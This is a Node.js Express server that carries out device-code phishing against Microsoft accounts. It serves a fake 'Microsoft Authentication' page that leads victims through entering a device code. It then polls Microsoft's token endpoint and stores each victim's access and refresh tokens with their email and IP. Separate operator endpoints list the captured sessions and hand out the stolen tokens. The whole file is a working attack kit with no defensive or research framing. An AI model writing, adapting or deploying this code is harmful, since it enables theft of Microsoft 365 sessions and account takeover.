const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// REPLACE WITH YOUR AZURE APP CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376p-zza';
// ============================================

let userSessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ============================================
// CREATE DEVICE CODE SESSION
// ============================================
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        res.json({ success: true, sid: sid, user_code: user_code });
        
    } catch (err) {
        console.error('Create session error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sid) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            userSessions.set(sid.toString(), {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            });
            
            pending.status = 'captured';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
            
        } catch (err) {
            // Normal - waiting for user
        }
    }, 3000);
}

// ============================================
// STATUS ENDPOINT
// ============================================
app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    
    const session = userSessions.get(sid);
    if (session) {
        return res.json({ status: 'captured', email: session.email });
    }
    
    for (const pending of pendingAuth.values()) {
        if (pending.sid.toString() === sid) {
            return res.json({ status: pending.status });
        }
    }
    
    res.json({ status: 'not_found' });
});

// ============================================
// SESSIONS ENDPOINT
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(userSessions.values()).map(s => ({
        sid: s.sid, email: s.email, name: s.name, ip: s.ip, capturedAt: s.capturedAt
    }));
    res.json({ sessions: sessionList });
});

app.get('/api/session/token/:sid', async (req, res) => {
    const session = userSessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ email: session.email, token: session.tokens.access_token });
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// ============================================
// GENERATE AUTH PAGE - FIXED
// ============================================
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        // Simple HTML that works
        const html = `<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Authentication</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .card{background:#fff;border-radius:20px;padding:40px;max-width:500px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
        h2{color:#2b2b2b;margin-bottom:10px}
        p{color:#6b7280;margin-bottom:20px}
        .code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:20px;border-radius:12px;margin:20px 0;color:#0078d4;font-family:monospace}
        .btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin:5px}
        .btn:hover{background:#005fa3}
        .status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
        .spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px;vertical-align:middle}
        @keyframes spin{to{transform:rotate(360deg)}}
        .steps{text-align:left;margin-top:20px;padding:15px;background:#f8f9fa;border-radius:10px;font-size:12px}
        .steps ol{padding-left:20px;margin-top:5px}
        .steps li{margin:5px 0}
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 Microsoft Authentication</h2>
    <p>Sign in with your Microsoft account</p>
    <div class="code" id="userCode">${user_code}</div>
    <button class="btn" onclick="copyCode()">📋 Copy Code</button>
    <button class="btn" id="openBtn">🔑 Open Microsoft Login</button>
    <div class="steps">
        <strong>📋 Steps:</strong>
        <ol>
            <li>Click "Open Microsoft Login"</li>
            <li>Enter code: <strong>${user_code}</strong></li>
            <li>Sign in with your Microsoft account</li>
            <li>Click "Continue" or "Accept"</li>
            <li>This window will auto-close</li>
        </ol>
    </div>
    <div class="status" id="statusMsg">
        <span class="spinner"></span> Waiting for authentication...
    </div>
</div>
<script>
    const SESSION_ID = ${sid};
    const API_URL = window.location.origin;
    
    function copyCode() {
        const code = document.getElementById('userCode').innerText;
        navigator.clipboard.writeText(code);
        alert('✓ Code copied!');
    }
    
    document.getElementById('openBtn').onclick = function() {
        window.open('https://login.microsoftonline.com/common/oauth2/v2.0/deviceauth', '_blank', 'width=600,height=700');
    };
    
    async function checkStatus() {
        try {
            const response = await fetch(API_URL + '/api/status/' + SESSION_ID);
            const data = await response.json();
            if (data.status === 'captured') {
                document.getElementById('statusMsg').innerHTML = '✅ Authentication successful! Session captured. You can close this window.';
                setTimeout(() => window.close(), 2000);
            }
        } catch(e) {
            console.error('Status check error:', e);
        }
        setTimeout(checkStatus, 3000);
    }
    
    checkStatus();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        console.error('Generate page error:', err.message);
        // Send a simple error page
        res.status(500).send(`
            <!DOCTYPE html>
            <html>
            <head><title>Error</title></head>
            <body style="font-family:Arial;text-align:center;padding:50px">
                <h2>❌ Error</h2>
                <p>Failed to generate auth page: ${err.message}</p>
                <p>Make sure you have set YOUR_CLIENT_ID correctly in server.js</p>
            </body>
            </html>
        `);
    }
});

// ============================================
// DASHBOARD
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Dashboard: https://greatness-dashboard.onrender.com`);
    console.log(`📍 Auth Page: https://greatness-dashboard.onrender.com/generate-auth-page`);
    console.log(`========================================\n`);
});
